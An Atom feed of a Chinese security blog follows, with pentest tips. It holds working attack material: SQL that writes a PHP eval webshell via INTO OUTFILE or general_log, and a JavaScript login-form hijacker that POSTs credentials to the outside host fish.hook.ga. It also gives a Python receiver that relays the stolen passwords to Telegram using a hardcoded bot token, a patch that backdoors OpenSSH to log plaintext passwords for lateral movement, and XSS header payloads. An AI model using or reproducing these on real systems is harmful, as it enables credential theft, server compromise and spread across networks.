<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>初心·守一</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://reboot.cf/"/>
  <updated>2018-03-14T07:17:56.000Z</updated>
  <id>http://reboot.cf/</id>
  
  <author>
    <name>初心·守一</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MySQL写Webshell</title>
    <link href="http://reboot.cf/2018/03/14/MySQL%E5%86%99Webshell/"/>
    <id>http://reboot.cf/2018/03/14/MySQL写Webshell/</id>
    <published>2018-03-14T07:15:43.000Z</published>
    <updated>2018-03-14T07:17:56.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>利用 OUTFILE 功能写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `test`.`pentest` (`pentestdata` TEXT NOT NULL );</span><br><span class="line">INSERT INTO `test`.`pentest` (`pentestdata` )VALUES (&apos;&lt;?php eval($_POST[a]);?&gt;&apos;);</span><br><span class="line">SELECT * FROM pentest INTO OUTFILE &apos;D:/phpStudy/WWW/pentest.php&apos;;</span><br></pre></td></tr></table></figure><p>利用日志功能写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;;</span><br><span class="line">set global general_log = on;</span><br><span class="line">set global general_log_file = &apos;D:/phpStudy/WWW/pentest.php&apos;;</span><br><span class="line">select &apos;&lt;?php eval($_POST[a]);?&gt;&apos;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;利用 OUTFILE 功能写文件&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;
      
    
    </summary>
    
    
      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
    
      <category term="Pentest" scheme="http://reboot.cf/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>使用Telegram API接收消息</title>
    <link href="http://reboot.cf/2018/03/12/%E4%BD%BF%E7%94%A8Telegram-API%E6%8E%A5%E6%94%B6%E6%B6%88%E6%81%AF/"/>
    <id>http://reboot.cf/2018/03/12/使用Telegram-API接收消息/</id>
    <published>2018-03-12T06:51:36.000Z</published>
    <updated>2018-03-12T06:56:56.986Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>Telegram Bot API <a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">文档地址</a></p><p>发送请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org/bot<span class="tag">&lt;<span class="name">token</span>&gt;</span>/METHOD_NAME</span><br></pre></td></tr></table></figure><p>获取更新数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org//bot<span class="tag">&lt;<span class="name">token</span>&gt;</span>/getUpdates</span><br></pre></td></tr></table></figure><p>发送消息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org/bot&#123;token&#125;/sendMessage?chat_id=&#123;chat_id&#125;&amp;text=&#123;data&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;Telegram Bot API &lt;a href=&quot;https://core.telegram.org/bots/api&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;文档地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;发送请求&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用js获取前端登录密码</title>
    <link href="http://reboot.cf/2018/03/12/%E5%88%A9%E7%94%A8js%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81/"/>
    <id>http://reboot.cf/2018/03/12/利用js获取前端登录密码/</id>
    <published>2018-03-12T03:22:55.000Z</published>
    <updated>2018-03-13T03:16:41.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>前端代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Send_Data</span>(<span class="params">sj_url,sj_username,sj_passwd</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">                xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.overrideMimeType) &#123; xmlhttp.overrideMimeType(<span class="string">'text/xml'</span>); &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">                <span class="keyword">var</span> xmlobj = [<span class="string">'Microsoft.XMLHTTP'</span>,<span class="string">'MSXML.XMLHTTP'</span>,<span class="string">'Msxml2.XMLHTTP.8.0'</span>,<span class="string">'Msxml2.XMLHTTP.7.0'</span>,<span class="string">'Msxml2.XMLHTTP.6.0'</span>,<span class="string">'Msxml2.XMLHTTP.3.0'</span>,<span class="string">'Msxml2.XMLHTTP'</span>];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; xmlobj.length;i++) &#123; <span class="keyword">try</span> &#123; xmlhttp = <span class="keyword">new</span> ActiveXObject(xmlobj[i]); &#125; <span class="keyword">catch</span>(e) &#123;&#125; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!xmlhttp) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="keyword">var</span> time=<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        sj_time = time.getFullYear()+<span class="string">"-"</span>+time.getMonth()+<span class="string">"-"</span>+time.getDate()+<span class="string">" "</span>+time.getHours()+<span class="string">":"</span>+time.getMinutes()+<span class="string">":"</span>+time.getUTCSeconds();</span><br><span class="line">        <span class="keyword">var</span> sjurl = <span class="string">'http://fish.hook.ga'</span>;</span><br><span class="line">        <span class="keyword">var</span> sjpos = <span class="built_in">escape</span>(sj_url)+<span class="string">'||'</span>+<span class="built_in">escape</span>(sj_username) +<span class="string">'||'</span>+<span class="built_in">escape</span>(sj_passwd)+<span class="string">"||"</span>+sj_time;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, sjurl, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">        xmlhttp.setRequestHeader(<span class="string">"Content-length"</span>,sjpos.length);</span><br><span class="line">        xmlhttp.setRequestHeader(<span class="string">"Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line">        xmlhttp.send(sjpos);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Form_Hijack</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ispwd = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>;k &lt; thisform.elements.length;k++) &#123;</span><br><span class="line">                <span class="keyword">var</span> sjobj = thisform.elements[k]; <span class="keyword">if</span>(sjobj.type == <span class="string">'password'</span>) &#123; ispwd = <span class="literal">true</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!ispwd) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">        <span class="keyword">var</span> sj_url = <span class="built_in">window</span>.location;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.parent.location) &#123; sj_url = <span class="built_in">window</span>.parent.location; &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.parent.document.referrer) &#123; sjref = <span class="built_in">window</span>.parent.document.referrer; &#125;</span><br><span class="line">        sj_username = <span class="built_in">document</span>.getElementById(<span class="string">"username"</span>).value;</span><br><span class="line">        sj_passwd = <span class="built_in">document</span>.getElementById(<span class="string">"password"</span>).value;</span><br><span class="line">        <span class="keyword">if</span>( sj_url &amp;&amp; sj_passwd ) &#123; Send_Data(sj_url,sj_username,sj_passwd); &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Start_Hijack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementsByTagName) &#123;</span><br><span class="line">                <span class="keyword">var</span> sjform = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"form"</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; sjform.length;i++) &#123; sjform[i].onsubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> Form_Hijack(<span class="keyword">this</span>); &#125; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line"><span class="built_in">document</span>.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.readyState == <span class="string">"complete"</span>) &#123; setTimeout(<span class="string">'Start_Hijack()'</span>,<span class="number">1000</span>); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后端接收器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">httplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    sock.send(<span class="string">'Welcome!'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"POST"</span> <span class="keyword">in</span> data:</span><br><span class="line">            header, html = data.split(<span class="string">'\r\n\r\n'</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url, username, password, datatime = html.split(<span class="string">'||'</span>, <span class="number">3</span>)</span><br><span class="line">                message = <span class="string">"[*] 接收到新消息！\n域名："</span> + url + <span class="string">"\n账号："</span> + username + <span class="string">"\n密码："</span> + password + <span class="string">"\n来源：%s:%s"</span> % addr + <span class="string">"\n时间："</span> + datatime + <span class="string">"\n"</span></span><br><span class="line">                <span class="keyword">print</span> message</span><br><span class="line">                sendData(message)</span><br><span class="line">                sock.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                error_message = <span class="string">"[*] 接收到新消息！\n但消息不合法！"</span> + <span class="string">"\n来源：%s:%s"</span> % addr + <span class="string">"\n时间："</span> + datatime +<span class="string">"\n"</span></span><br><span class="line">                <span class="keyword">print</span> error_message</span><br><span class="line">                sendData(error_message)</span><br><span class="line">                sock.close()</span><br><span class="line">        sock.close()</span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Connection from %s:%s closed.'</span> % addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendData</span><span class="params">(msg)</span>:</span></span><br><span class="line">    api_key = <span class="string">'491182934:AAEuOg4TaHpzRzQ1xWR4vcvOtv4KqLWoOQc'</span></span><br><span class="line">    chat_id = <span class="string">'560855481'</span></span><br><span class="line">    api_url = <span class="string">'https://api.telegram.org/bot&#123;&#125;/sendMessage?chat_id=&#123;&#125;&amp;text=&#123;&#125;'</span>.format(api_key, chat_id, msg)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respond = requests.get(api_url)</span><br><span class="line">        <span class="keyword">print</span> respond.content</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"消息发送失败！"</span>, e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Socket created'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s.bind((HOST, PORT))</span><br><span class="line"><span class="keyword">except</span> socket.error , msg:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[！] Bind failed. Error Code : '</span> + str(msg[<span class="number">0</span>]) + <span class="string">' Message '</span> + msg[<span class="number">1</span>]</span><br><span class="line">sys.exit()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Socket bind complete'</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Socket now listening'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=httplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;前端代码：&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>重编译安装OpenSSH记录登录密码</title>
    <link href="http://reboot.cf/2018/03/12/%E9%87%8D%E7%BC%96%E8%AF%91OpebSSH%E8%AE%B0%E5%BD%95%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81/"/>
    <id>http://reboot.cf/2018/03/12/重编译OpebSSH记录登录密码/</id>
    <published>2018-03-12T02:21:37.000Z</published>
    <updated>2018-03-12T03:05:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>横向渗透的时候，可以通过重新编译安装添加后门的 OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器<br><a id="more"></a><br>OpenSSH <a href="https://www.openssh.com/portable.html" target="_blank" rel="noopener">源码下载地址</a></p><p>编辑 auth-passwd.c 文件，在 auth_password 函数中添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logit(<span class="string">"username: %s password: %s"</span>, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure><p>重新编译安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords --mandir=/usr/share/man</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>有些环境在编译的时候会报缺少xx头文件的错，安装对应的库就可以了，比如缺少 zlib.h</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libssl-dev libz-dev</span><br></pre></td></tr></table></figure><p>查看记录的登录密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/auth.log</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;横向渗透的时候，可以通过重新编译安装添加后门的 OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器&lt;br&gt;
    
    </summary>
    
    
      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
    
      <category term="Pentest" scheme="http://reboot.cf/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>逆向破解学习</title>
    <link href="http://reboot.cf/2018/03/06/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%AD%A6%E4%B9%A0/"/>
    <id>http://reboot.cf/2018/03/06/逆向破解学习/</id>
    <published>2018-03-06T09:26:41.000Z</published>
    <updated>2018-03-07T08:35:05.350Z</updated>
    
    <content type="html"><![CDATA[<p>学习最艰难的是走出第一步<br><a id="more"></a></p><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p>PEiD：<br><img src="/images/PEiD_v9.4.png" alt="PEiD"></p><ol><li>查看入口点，即程序的入口地址</li><li>查看软件加的什么壳</li></ol><h1 id="调试器"><a href="#调试器" class="headerlink" title="调试器"></a>调试器</h1><p>OllyDbg:<br><img src="/images/OllyDbg_v1.10.png" alt="PEiD"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tools.pediy.com" target="_blank" rel="noopener">看雪工具</a><br><a href="https://www.kanxue.com/chm.htm" target="_blank" rel="noopener">看雪知识库</a><br><a href="https://down.52pojie.cn/Tools/Disassemblers/" target="_blank" rel="noopener">吾爱破解工具包</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习最艰难的是走出第一步&lt;br&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="http://reboot.cf/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>使用ELK技术栈做日志审计</title>
    <link href="http://reboot.cf/2018/02/28/%E4%BD%BF%E7%94%A8ELK%E6%8A%80%E6%9C%AF%E6%A0%88%E5%81%9A%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/"/>
    <id>http://reboot.cf/2018/02/28/使用ELK技术栈做日志审计/</id>
    <published>2018-02-28T01:54:47.000Z</published>
    <updated>2018-03-06T09:27:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>ELK 技术栈(即Logstash + ElasticSearch + Kibana)属于业界已经应用比较广泛且成熟的开源方案，这套一站式解决方案基本上可以满足大部分企业对日志管理体系的需求。<br><a id="more"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -XDELETE <span class="string">'127.0.0.1:9200/*'</span></span><br><span class="line">curl <span class="string">'localhost:9200/_cat/indices?v'</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    beats &#123;</span><br><span class="line">        port =&gt; <span class="number">5044</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="string">"bvip_nginx_access"</span> <span class="keyword">in</span> [fields][log_source] &#123;</span><br><span class="line">    grok &#123;</span><br><span class="line">      match =&gt; [<span class="string">"message"</span>,  <span class="string">"%&#123;COMBINEDAPACHELOG&#125;"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">geoip &#123;</span><br><span class="line">      source =&gt; <span class="string">"clientip"</span></span><br><span class="line">      target =&gt; <span class="string">"geoip"</span></span><br><span class="line">      database =&gt; <span class="string">"/home/zhangjf/ELK/logstash-6.2.2/GeoLite2-City.mmdb"</span></span><br><span class="line">      add_field =&gt; [ <span class="string">"[geoip][coordinates]"</span>, <span class="string">"%&#123;[geoip][longitude]&#125;"</span> ]</span><br><span class="line">      add_field =&gt; [ <span class="string">"[geoip][coordinates]"</span>, <span class="string">"%&#123;[geoip][latitude]&#125;"</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">mutate &#123;</span><br><span class="line">     convert =&gt; [ <span class="string">"[geoip][coordinates]"</span>, <span class="string">"float"</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">    elasticsearch &#123;</span><br><span class="line">    hosts =&gt; [ <span class="string">"127.0.0.1:9200"</span> ]</span><br><span class="line">    index =&gt; <span class="string">"logstash-%&#123;[fields][log_source]&#125;-%&#123;+YYYY.MM.dd&#125;"</span></span><br><span class="line">  &#125;</span><br><span class="line">    stdout &#123;codec =&gt; rubydebug&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">paths:</span></span><br><span class="line">  - <span class="string">"/home/elk/nginx/1.log"</span></span><br><span class="line"><span class="symbol">fields:</span></span><br><span class="line">  <span class="symbol">log_source:</span> bvip_nginx_access</span><br><span class="line"></span><br><span class="line"><span class="symbol">paths:</span></span><br><span class="line">  - <span class="regexp">/home/elk</span><span class="regexp">/apache/</span>*.log</span><br><span class="line"><span class="symbol">fields:</span></span><br><span class="line">  <span class="symbol">log_source:</span> bvip_apache_access</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ELK 技术栈(即Logstash + ElasticSearch + Kibana)属于业界已经应用比较广泛且成熟的开源方案，这套一站式解决方案基本上可以满足大部分企业对日志管理体系的需求。&lt;br&gt;
    
    </summary>
    
    
      <category term="tools" scheme="http://reboot.cf/tags/tools/"/>
    
      <category term="ELKF" scheme="http://reboot.cf/tags/ELKF/"/>
    
  </entry>
  
  <entry>
    <title>笔记</title>
    <link href="http://reboot.cf/2018/02/09/%E4%B8%80%E4%BA%9BTips/"/>
    <id>http://reboot.cf/2018/02/09/一些Tips/</id>
    <published>2018-02-09T08:51:39.000Z</published>
    <updated>2018-03-06T08:40:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些容易忘的东西<br><a id="more"></a></p><h1 id="修改真实IP"><a href="#修改真实IP" class="headerlink" title="修改真实IP"></a>修改真实IP</h1><p>Burp Suite –&gt; Options –&gt; Match adn Replace –&gt; Add</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP-CLIENT-IP: &lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;/script&gt;</span><br><span class="line">HTTP-FORWARDED-FOR: &lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;/script&gt;</span><br><span class="line">Client-IP: &lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;/script&gt;</span><br><span class="line">HTTP-X-FORWARDED-FOR: 127.0.0.1</span><br><span class="line">HTTP-X-FORWARDED: 127.0.0.1</span><br><span class="line">HTTP-X-CLUSTER-CLIENT-IP: 127.0.0.1</span><br><span class="line">HTTP-FORWARDED-FOR: 127.0.0.1</span><br><span class="line">HTTP-FORWARDED: 127.0.0.1</span><br><span class="line">REMOTE-ADDR: 127.0.0.1</span><br><span class="line">HTTP-VIA: 127.0.0.1</span><br></pre></td></tr></table></figure><h1 id="Vbox共享文件夹没有权限访问"><a href="#Vbox共享文件夹没有权限访问" class="headerlink" title="Vbox共享文件夹没有权限访问"></a>Vbox共享文件夹没有权限访问</h1><p>报错：This location could not be displayed. You do not have the permissionsnecessary to view the contents.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G vboxsf username</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h1 id="S3-Bucket"><a href="#S3-Bucket" class="headerlink" title="S3 Bucket"></a>S3 Bucket</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install aws-shell</span><br><span class="line">aws s3 ls s3://flaws.cloud.s3.amazonaws.com --no-sign-request</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一些容易忘的东西&lt;br&gt;
    
    </summary>
    
    
      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>Go 语言学习</title>
    <link href="http://reboot.cf/2018/02/01/Go-%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://reboot.cf/2018/02/01/Go-语言学习/</id>
    <published>2018-02-01T07:05:34.000Z</published>
    <updated>2018-02-10T02:13:32.000Z</updated>
    
